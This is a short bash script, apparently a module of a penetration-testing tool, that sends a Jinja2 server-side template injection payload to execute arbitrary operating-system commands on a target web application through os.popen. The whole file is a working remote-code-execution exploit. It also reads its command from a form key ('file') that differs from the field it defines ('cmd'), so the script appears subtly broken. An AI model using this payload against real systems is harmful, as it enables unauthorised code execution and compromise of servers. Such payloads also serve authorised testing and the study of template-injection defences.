#!/bin/bash

: '
SSTI - jinja2 rce dump file with built in import, execute code
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
CMD_FIELD=$(form_item "execute cmd" "cmd" "id")

# Generate GUI form
generate_form "${CMD_FIELD}"

CMD=${form_data["file"]}

execute_command "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${CMD}').read() }}"
